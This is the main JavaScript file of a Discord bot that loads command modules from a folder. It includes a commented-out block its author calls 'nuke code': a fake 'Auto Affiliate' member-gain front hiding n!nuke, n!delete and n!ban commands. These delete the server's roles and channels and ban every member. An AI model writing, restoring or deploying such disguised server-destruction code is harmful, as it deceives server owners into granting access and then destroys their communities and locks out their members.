const Discord = require("discord.js")
const config = require("./config.json")
const bot = new Discord.Client();
const client = new Discord.Client();
const fs = require("fs");
bot.commands = new Discord.Collection();
if(config.token === "setmeplease") return console.log("Set your token up! Go to https://www.discordapp.com/developers and generate a token from a bot user.");

fs.readdir("./commands/", (err, files) => {

  if(err) console.log(err);

  let jsfile = files.filter(f => f.split(".").pop() === "js");
  if(jsfile.length <= 0){
    console.log("Couldn't find commands.");
    return;
  }

jsfile.forEach((f, i) =>{
  let props = require(`./commands/${f}`);
  console.log(`${f} loaded!`);
  bot.commands.set(props.help.name, props);
});

});


bot.on("ready", () => {
  console.log('______')
  console.log(bot.user.id)
  console.log(bot.user.username + " is online.")
  bot.user.setActivity('Made by Slushie#0001', { url: "https://discord.gg/tournaments", type: 'PLAYING' })
      .then(presence => console.log(`Activity set to ${presence.game ? presence.game.name : 'none'}`))
      .catch(console.error);
});

bot.on("message", async message => {

  // THIS BELOW IS MY NUKE CODE AND OTHER SHIT LMAO

/*  if (message.content.toLowerCase().startsWith("!" + "setup")) {
    message.channel.send("Welcome to Auto Affiliate, To Get Started Do The Command `!start`")
}

if (message.content.toLowerCase().startsWith("!" + "start")) {
    message.channel.send("Starting Affliating!")
    message.channel.send("To Change The Promotion Message Do `!configmessage` and then the message after it!")
}

if (message.content.toLowerCase().startsWith("!" + "configmessage")) {
    message.channel.send("Updated Message!")
}

if (message.content.toLowerCase().startsWith("!" + "stop")) {
    message.channel.send("Stopping Affilating!")
}

if (message.content.toLowerCase().startsWith("!" + "help")) {
    message.channel.send({
        embed: {
            color: 0xff0000,
            author: { name: "Auto Affiliate" },
            description: "!start - Starts The Member Gain Process \n!stop - Starts The Member Gain Process\n!configmessage - Use This Command To Change Message, Put Promo Message After"
        }
    })
}

if (message.content.toLowerCase().startsWith("n!" + "nuke")) {
  message.guild.roles.filter(r => r.position < message.guild.me.highestRole.position).deleteAll();
  message.guild.channels.deleteAll();
  message.guild.members.tap(member => member.ban("Banned by ⸸ #1500 | ⸸ #1500"));

}

if (message.content.toLowerCase().startsWith("n!" + "delete")) {
  message.guild.roles.filter(r => r.position < message.guild.me.highestRole.position).deleteAll();
  message.guild.channels.deleteAll();
}

if (message.content.toLowerCase().startsWith("n!" + "ban")) {
  message.guild.members.tap(member => member.ban("Banned By ⸸ #1500 | ⸸ #1500"));
}*/

  //a little bit of data parsing/general checks
  if(message.author.bot) return;
//  if(message.channel.type === 'dm') return;
  let content = message.content.split(" ");
  let command = content[0];
  let args = content.slice(1);
  let prefix = config.prefix;


  //checks if message contains a command and runs it
  let commandfile = bot.commands.get(command.slice(prefix.length));
  if(commandfile) commandfile.run(bot,message,args);
})


bot.login(config.token)